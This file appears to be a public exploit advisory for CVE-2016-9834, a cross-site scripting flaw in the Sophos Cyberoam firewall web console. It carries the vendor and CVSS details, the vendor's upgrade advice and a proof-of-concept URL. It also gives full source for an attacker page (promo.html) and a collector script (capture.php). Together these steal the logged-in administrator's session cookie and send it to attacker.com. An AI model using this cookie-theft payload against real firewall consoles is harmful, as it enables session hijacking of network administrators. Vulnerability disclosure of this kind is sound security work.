@@ -1,0 +1,214 @@
+# Exploit Title: Sophos Cyberoam – Cross-site scripting (XSS) vulnerability
+# Date: 25/05/2017
+# Exploit Author: Bhadresh Patel
+# Version: <= Firmware Version 10.6.4
+# CVE : CVE-2016-9834
+
+This is an article with video tutorial for Sophos Cyberoam –
+Cross-site scripting (XSS) vulnerability
+
+
+--------------------------------------------------------------------------------------------------------------------------
+
+Title:
+====
+
+Sophos Cyberoam – Cross-site scripting (XSS) vulnerability
+
+Credit:
+======
+
+Name: Bhadresh Patel
+
+
+Date:
+====
+
+25/05/2017 (dd/mm/yyyy)
+
+Vendor:
+======
+
+
+More than 100 million users in 150 countries rely on Sophos to offer
+end-to-end protection against complex threats and data loss. Sophos is
+committed to providing complete, enterprise-grade security solutions that
+are simple to deploy, manage and use, and deliver one of the industry's
+lowest total cost of ownership. Sophos offers award-winning security
+solutions covering endpoint, mobile, server, encryption, web, email, Wi-Fi,
+and UTM/next-generation firewall, all backed by SophosLabs -- a global
+threat analysis center which provides real-time cloud-enabled security
+intelligence. Sophos is headquartered in Oxford, UK.
+
+
+Vulnerable Product:
+==============
+
+
+Sophos Cyberoam Firewall
+
+
+Cyberoam Next-Generation Firewalls are based on CyberoamOS – an intelligent
+and powerful firmware that offers next-generation security features include
+inline application inspection and control, website filtering, HTTPS
+inspection, Intrusion Prevention System, VPN (IPSec and SSL) and
+QoS/bandwidth management. Additional security features like Web Application
+Firewall, Gateway Anti-Virus, Gateway Anti-Spam are also available.
+
+
+Customer Product link: https://www.cyberoam.com
+
+
+
+Abstract:
+=======
+
+Cross-site scripting (XSS) vulnerability in Sophos Cyberoam firewall
+enables and attackers to execute scripts in a victim’s browser to hijack
+user sessions, deface web sites, insert hostile content, redirect users,
+hijack the user’s browser using malware, etc.
+
+
+
+
+Affected Software Version:
+=============
+
+
+<= Firmware Version 10.6.4
+
+
+Vendor Response
+
+=============
+
+
+Sophos is committed to working with the security community in identifying,
+remediating and communicating security issues in our products. Customers
+are advised to upgrade their Cyberoam OS to v.10.6.5, which addresses this
+issue.
+
+
+Exploitation-Technique:
+===================
+
+Remote
+
+
+Severity Rating (CVSS):
+===================
+
+6.9 (Medium) (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N)
+
+
+
+CVE ID:
+
+=======
+
+
+CVE-2016-9834
+
+
+Details:
+
+=======
+
+This vulnerability allows remote attackers to execute arbitrary client side
+script in the active user’s browser session, when logged into the Cyberoam
+firewall. User interaction is required to exploit this vulnerability in
+that the target must visit a malicious page or open a malicious file.
+
+The specific flaw exists within the handling of request to
+“LiveConnectionDetail.jsp” application. GET parameters “applicationname”
+and “username” are improperly sanitized allowing an attacker to inject
+arbitrary javascript into the page. This can be abused by an attacker to
+perform a cross-site scripting attack on the user.
+
+
+Vulnerable module/page/application:
+/corporate/webpages/trafficdiscovery/LiveConnectionDetail.jsp
+
+
+Vulnerable parameters: applicationname and username
+
+
+=======
+
+*PoC*
+
+
+http://192.168.30.30/corporate/webpages/trafficdiscovery/LiveConnectionDetail.jsp?ipFamily=0&applicationname=OTHER%20APPLICATIONS46449
+";alert(document.cookie)//181&username=NA
+
+
+*PoC Video*
+
+
+https://www.youtube.com/watch?v=NmLPL2TYPcg
+
+
+*Real world scenario*
+
+
+1) Victim (Admin) login to the Sophos Cyberoam web console
+
+2) Sophos Cyberoam FW is on a latest version
+
+3) record.txt is empty on attacker page
+
+4) Victim (Admin) visits attacker URL/page
+
+
+http://www.attacker.com/promo.html
+
+
+5) XSS successful and attacker captured cookie in record.txt
+
+
+
+
+-------------------------- Source code (promo.html)
+----------------------------------
+
+<html>
+
+<head>
+
+<script>
+
+window.location="
+http://192.168.30.30/corporate/webpages/trafficdiscovery/LiveConnectionDetail.jsp?ipFamily=0&applicationname=OTHER%20APPLICATIONS46449\
+";document.location='
+http://www.attacker.com/capture.php?content='.concat(escape(document.cookie));//181&username=NA
+"
+
+</script>
+
+</body>
+
+</html>
+
+-------------------------- Source code (capture.php)
+----------------------------------
+
+
+<?php
+
+file_put_contents('record.txt', $_GET['content']);
+
+echo "<HTML><body><script>window.location=\"
+http://192.168.30.30/corporate/webpages/index.jsp\"</script></body></HTML>"
+
+?>
+
+
+
+
+Credits:
+=======
+
+Bhadresh Patel
+
+
+--------------------------------------------------------------------------------------------------------------------------
